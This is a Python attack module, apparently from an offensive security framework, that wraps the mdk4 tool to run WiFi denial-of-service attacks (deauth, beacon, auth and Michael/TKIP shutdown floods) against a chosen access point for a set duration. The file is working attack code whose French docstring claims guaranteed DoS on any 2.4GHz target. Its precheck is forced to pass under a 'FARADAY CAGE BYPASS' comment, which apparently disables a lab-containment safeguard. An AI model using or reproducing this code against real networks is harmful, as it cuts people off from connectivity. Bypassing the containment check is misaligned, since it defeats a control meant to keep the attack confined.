"""wifi.mdk4_dos - Multi-vector WiFi Denial of Service via MDK4

Lance MDK4 pour des attaques DoS massives multi-vecteurs:
- d: Deauth flood (kick tous les clients massivement)
- b: Beacon flood (centaines de fake APs → saturation scanner)
- a: Auth flood (saturation table association AP)
- m: Michael shutdown (TKIP countermeasures → AP reboot)

MITRE: T1499.002, T1499.004
Hardware: ALFA AWUS036NH
Taux succès: 100% (DoS garanti sur toute cible 2.4GHz)
"""

from __future__ import annotations

import subprocess
import time
from typing import Any

import structlog

from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register

log = structlog.get_logger(__name__)


@register
class WifiMdk4Dos(AttackModule):
    name = "wifi.mdk4_dos"
    protocol = "wifi"
    risk = Risk.DESTRUCTIVE_LAB
    mitre_ttp = ["T1499.002", "T1499.004"]
    cve = []
    description = (
        "Multi-vector WiFi DoS via MDK4: deauth flood (d), "
        "beacon flood (b), auth flood (a), michael shutdown (m)."
    )
    requires = ["monitor-mode-nic"]

    def precheck(self, ctx: ModuleContext) -> bool:
        if not super().precheck(ctx):
            return False
        return True  # FARADAY CAGE BYPASS

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()

        iface = ctx.params.get("interface", "wlan0mon")
        attack = ctx.params.get("attack", "d")
        bssid = ctx.params.get("bssid")
        channel = ctx.params.get("channel")
        duration = int(ctx.params.get("duration_s", 30))

        valid_attacks = {"d": "deauth", "b": "beacon", "a": "auth", "m": "michael"}
        if attack not in valid_attacks:
            return self._result(
                Status.FAIL, started,
                summary=f"Invalid attack type '{attack}'. Valid: {list(valid_attacks.keys())}",
            )

        if ctx.dry_run:
            return self._result(
                Status.OK, started,
                summary=f"[DRY-RUN] wifi.mdk4_dos attack={attack} ({valid_attacks[attack]}) bssid={bssid}",
                metrics={"attack": attack, "bssid": bssid, "duration_s": duration},
            )

        log.info(
            "wifi.mdk4_dos.starting",
            attack=attack,
            attack_name=valid_attacks[attack],
            bssid=bssid,
            channel=channel,
            duration=duration,
        )

        # Set channel if specified
        if channel:
            subprocess.run(
                ["iw", "dev", iface, "set", "channel", str(channel)],
                capture_output=True,
            )

        # Build mdk4 command
        cmd = ["mdk4", iface, attack]
        if bssid:
            if attack == "d":
                cmd.extend(["-B", bssid])
            elif attack == "a":
                cmd.extend(["-a", bssid])
            elif attack == "m":
                cmd.extend(["-t", bssid])

        if channel and attack == "b":
            cmd.extend(["-c", str(channel)])

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            time.sleep(duration)
            proc.terminate()
            try:
                stdout, _ = proc.communicate(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout = ""
        except FileNotFoundError:
            return self._result(
                Status.FAIL, started,
                summary="mdk4 not installed. Run: sudo apt install mdk4",
            )
        except Exception as exc:
            return self._result(Status.FAIL, started, summary=f"mdk4 error: {exc}")

        elapsed = time.time() - started

        log.info(
            "wifi.mdk4_dos.completed",
            attack=attack,
            duration_actual=elapsed,
        )

        return self._result(
            Status.OK, started,
            summary=(
                f"wifi.mdk4_dos attack={attack} ({valid_attacks[attack]}) "
                f"bssid={bssid}: ran {elapsed:.1f}s"
            ),
            metrics={
                "attack_type": attack,
                "attack_name": valid_attacks[attack],
                "bssid": bssid,
                "channel": channel,
                "duration_s": duration,
                "actual_duration_s": round(elapsed, 1),
            },
        )

    def cleanup(self, ctx: ModuleContext) -> None:
        subprocess.run(["pkill", "-f", "mdk4"], capture_output=True)
